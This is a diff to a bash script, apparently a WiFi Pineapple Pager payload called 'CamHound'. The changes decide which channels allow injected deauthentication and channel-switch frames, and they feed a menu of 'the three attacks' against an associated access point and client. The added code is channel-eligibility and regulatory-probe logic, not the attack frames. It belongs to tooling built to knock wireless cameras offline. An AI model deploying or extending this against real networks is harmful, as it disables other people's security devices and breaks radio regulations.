@@ -321,15 +321,91 @@ hex_octet() {   # hex_octet <hexstring> <index0> -> decimal octet, nonzero rc if
   printf '%d' "$(( 16#$b ))"
 }
 
-csa_injectable() {   # csa_injectable <band> <channel> -> 0 when the radio may legally transmit
+# Injectability is decided by two independent gates in series; a frame needs both.
+#   Gate 1 -- pineapd, in userspace.  A compiled-in channel switch, duplicated in
+#     pineap_wifi_interface::inject (0x46e800-0x46e826) and
+#     interface_tracker::inject_deauth (0x472c66-0x472c8a).  It never asks the kernel
+#     about regulatory state (no NL80211_CMD_GET_REG anywhere in the binary), so no
+#     regdb edit, country change or `iw reg set` can lift it.  pcap_inject has exactly
+#     one call site, inside the gated function, so every injected frame passes it.
+#   Gate 2 -- cfg80211, in the kernel.  cfg80211_reg_check_beaconing() rejects a
+#     monitor-mode frame whose channel is flagged DISABLED or NO_IR.  RADAR alone does
+#     not block it.  This gate DOES follow the regulatory domain, so it is read live.
+# Why guessing here is unsafe: a frame rejected by gate 2 is freed with NETDEV_TX_OK,
+# so nothing reports an error.  An over-permissive verdict therefore reads back as the
+# target having resisted, which is worse than refusing a channel that would have worked.
+# Full derivation and re-verification recipe: dev/pager-csa-primitives.md.
+PINEAPD_DFS_BLOCKED=" 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 "
+declare -A INJ_OK        # "<band>/<channel>" -> 1 permitted by gate 2, 0 refused
+INJ_PROBED=0             # 0 not yet probed, 1 probe usable, -1 probe failed -> fallback
+INJ_PROBE_TS=0
+
+# inj_probe must run in the PARENT shell: it populates INJ_OK, and csa_injectable is
+# reached from posture_from_caps inside $( ), where writes to globals are discarded.
+inj_probe() {   # inj_probe [force] -> 0 when INJ_OK is usable
+  local phy d line freq ch dis rows=""
+  [ "$1" = force ] || { (( INJ_PROBED != 0 && EPOCHSECONDS - INJ_PROBE_TS < POSTURE_TTL )) && return $(( INJ_PROBED == 1 ? 0 : 1 )); }
+  INJ_PROBE_TS=$EPOCHSECONDS; INJ_PROBED=-1; INJ_OK=()
+  command -v iw >/dev/null 2>&1 || return 1
+  # Every phy is probed and merged: pineapd picks its own inject interface, and each phy
+  # registers only its own bands, so band/channel keys do not collide across them.
+  for d in /sys/class/ieee80211/*; do
+    [ -e "$d" ] || continue
+    phy=${d##*/}
+    rows+=$(iw phy "$phy" channels 2>/dev/null)$'\n'
+  done
+  [ -n "${rows//[[:space:]]/}" ] || return 1
+  while IFS='|' read -r freq ch dis; do
+    [[ $freq =~ ^[0-9]+$ && $ch =~ ^[0-9]+$ ]] || continue
+    local band; band=$(band_of "$freq")
+    [ "$band" = '?' ] && continue
+    if (( dis == 0 )); then INJ_OK[$band/$ch]=1; else INJ_OK[$band/$ch]=0; fi
+  done < <(printf '%s' "$rows" | inj_parse_channels)
+  (( ${#INJ_OK[@]} )) || return 1
+  INJ_PROBED=1; return 0
+}
+
+# Parsed against the shipped iw's own format strings, not an invented layout: the channel
+# line is "\t* %d MHz [%d] " optionally followed by "(disabled)", then indented attribute
+# lines, of which only "No IR" blocks transmission ("Radar detection" does not -- gate 2
+# prohibits DISABLED and NO_IR, never RADAR).  Matching "MHz [n]" loosely also covers the
+# "phy%d %d MHz [%d]:" variant present in the same binary.
+inj_parse_channels() {   # stdin: iw phy <phy> channels -> "freq|channel|blocked" rows
+  awk '
+      function flush() { if (ch != "") printf "%d|%d|%d\n", freq, ch, bad }
+      /MHz[ \t]*\[[0-9]+\]/ {
+          flush()
+          freq = $0; sub(/^[^0-9]*/, "", freq); sub(/[^0-9].*$/, "", freq)
+          ch = $0; sub(/^.*\[/, "", ch); sub(/\].*$/, "", ch)
+          bad = ($0 ~ /\(disabled\)/) ? 1 : 0
+          next
+      }
+      /^[ \t]+No IR[ \t]*$/ { if (ch != "") bad = 1; next }
+      /^[Bb]and [0-9]+:/    { flush(); ch = ""; next }
+      END { flush() }'
+}
+
+csa_injectable() {   # csa_injectable <band> <channel> -> 0 when a frame can actually leave
   local b="$1" c="$2"
   [[ $c =~ ^[0-9]+$ ]] || return 1
+  # gate 1: pineapd's compiled-in refusals, independent of regulatory state
+  [ "$b" = 5 ] && [[ $PINEAPD_DFS_BLOCKED == *" $c "* ]] && return 1
+  # 6 GHz stays refused: pineapd rejects a channel whose band field is 6 GHz outright,
+  # and whether our command path produces that encoding is unverified.  Until the
+  # determination plan settles it on real hardware, refusing is the safe verdict.
+  [ "$b" = 6 ] && return 1
+  # gate 2: the live regulatory state, when we managed to read it
+  if (( INJ_PROBED == 1 )); then
+    [ "${INJ_OK[$b/$c]}" = 1 ] && return 0
+    return 1                 # 0 = refused, unset = this phy never registered the channel
+  fi
+  # Fallback when the probe is unavailable: only what is injectable under BOTH the US
+  # and the world ("00") domain, since we cannot tell which one is live.  Under 00,
+  # 5 GHz 149-165 and 2.4 GHz 12-14 carry NO_IR and 2.4 GHz 12-14 are DISABLED under US.
   case "$b" in
-    2) return 0 ;;
-    5) (( c >= 36 && c <= 48 )) && return 0
-       (( c >= 149 && c <= 165 )) && return 0
-       return 1 ;;          # 52-144 is DFS: cfg80211 marks it NO_IR, injection is dropped
-    *) return 1 ;;          # 6 GHz is NO_IR for injection, and always WPA3 anyway
+    2) (( c >= 1 && c <= 11 )) && return 0; return 1 ;;
+    5) (( c >= 36 && c <= 48 )) && return 0; return 1 ;;
+    *) return 1 ;;
   esac
 }
 
@@ -864,6 +940,7 @@ preflight() {
   if (( SIG_COUNT < 10 )); then load_signatures <(builtin_signatures); SIG_SOURCE="built-in"; fi
   (( SIG_COUNT == 0 )) && { set_state FAIL; ERROR_DIALOG "CamHound: no signatures" 2>/dev/null; exit 0; }
   load_inventory
+  inj_probe || LOG yellow "regulatory probe failed: injectable channels limited to the set that is safe in any domain"
 }
 BANDS_LINE=""; INSTALL_DIR=""
 run_lock() {
@@ -1415,6 +1492,7 @@ disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon 
     LOG red "nothing to attack: no associated BSS or no channel for $mac"; return 0
   fi
   LOG "reading posture ${R_BSSID:9} ch $R_CH"
+  inj_probe                    # here, not inside posture_of: $( ) would discard the cache
   posture_of "$R_BSSID" "$R_BAND" "$R_CH" >/dev/null; badge="$POSTURE_LAST"
   opts=$(posture_opts "$badge")
   LOG "[$badge] ${R_BSSID:9} ch$R_CH ${R_BAND}GHz"$'\n'"target ${R_TARGET:9}"$'\n'"$(posture_why "$badge")"
